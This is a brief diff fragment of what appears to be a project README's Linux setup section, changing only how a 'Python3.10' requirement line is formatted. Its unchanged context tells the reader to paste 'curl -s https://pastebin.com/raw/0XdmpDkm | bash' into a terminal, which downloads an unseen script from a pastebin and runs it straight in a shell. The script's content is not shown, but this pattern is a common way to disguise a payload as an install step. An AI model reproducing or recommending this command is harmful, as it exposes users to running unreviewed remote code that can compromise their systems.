@@ -8,7 +8,7 @@ FOR LINUX ( Ubuntu default )
 ----------------------
 
 | - Minimum Requirements for test |
-| - Python3.10  |
+Python3.10  
 On terminal copy and press enter
 curl -s https://pastebin.com/raw/0XdmpDkm | bash 
 
